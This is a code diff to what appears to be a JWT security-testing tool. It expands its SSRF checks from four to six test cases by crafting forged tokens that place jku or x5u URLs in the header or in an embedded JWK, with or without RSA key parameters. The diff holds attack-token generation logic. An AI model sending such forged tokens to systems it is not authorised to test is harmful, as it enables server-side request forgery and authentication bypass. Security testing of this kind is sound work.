@@ -98,7 +98,7 @@ const vulnerabilities = {
         name: 'Server-Side Request Forgery (SSRF)',
         cve: 'N/A',
         description: 'Test the jku/x5u header for SSRF vulnerability. If the server implement this feature without validating the URL, an attacker can exploit SSRF.',
-        token_amount: 4
+        token_amount: 6
     },
     CustomKey: {
         name: "Custom Key Attack / Public Key Injection via embedded JWK",
@@ -3211,12 +3211,12 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     // I still leave the default value in the function parameter, since it is more readable
     url = url ? url : "http://localhost:8080";
 
-    //* 4 Testcases: x5u/jku in header and x5u/jku in extra jwk in header
+    //* 6 Testcases: x5u/jku in header; x5u/jku in extra jwk in header with RS key parameters; and x5u/jku in extra jwk in header without rsa key parameters 
     // token generation is straight forward, just add jku/x5u = url to the header
     //1. jku in header
     let header_jku = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
     header_jku.jku = url;
-
+    header_jku.jwk = undefined; // to avoid duplicates
     // remove ESCAPE_SEQUENCE from the header
     let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku), isCalledFromCustomKey)
 
@@ -3233,6 +3233,7 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     // 2. x5u in header
     let header_x5u = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
     header_x5u.x5u = url;
+    header_x5u.jwk = undefined; // to avoid duplicates
 
     // remove ESCAPE_SEQUENCE from the header
     header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u), isCalledFromCustomKey)
@@ -3287,6 +3288,46 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated jku in JWK in JWT header",
         variantName: 'JWK(jku) - kty: RSA',
+        originalToken: token,
+        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
+        originalReadable: header_json_org,
+        testReadable: header_with_duplicates,
+        vulnerability: vulnerabilities.SSRF
+    }))
+    
+    // 5. x5u in jwk without rsa key parameters
+    let header_x5u_jwk_without_keymaterial = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
+    header_x5u_jwk_without_keymaterial.jwk = {
+        kty: "RSA",
+        x5u: url
+    }
+
+    // remove ESCAPE_SEQUENCE from the header
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u_jwk_without_keymaterial), isCalledFromCustomKey)
+
+    test_cases.push(new TestCase({
+        description: "Test for SSRF via unvalidated x5u in JWK in JWT header",
+        variantName: 'JWK(x5u) - kty: RSA without key parameters',
+        originalToken: token,
+        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
+        originalReadable: header_json_org,
+        testReadable: header_with_duplicates,
+        vulnerability: vulnerabilities.SSRF
+    }))
+
+    // 6. jku in jwk without rsa key parameters
+    let header_jku_jwk_without_keymaterial = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
+    header_jku_jwk_without_keymaterial.jwk = {
+        kty: "RSA",
+        jku: url
+    }
+
+    // remove ESCAPE_SEQUENCE from the header
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku_jwk_without_keymaterial), isCalledFromCustomKey)
+
+    test_cases.push(new TestCase({
+        description: "Test for SSRF via unvalidated jku in JWK in JWT header",
+        variantName: 'JWK(jku) - kty: RSA without key parameters',
         originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
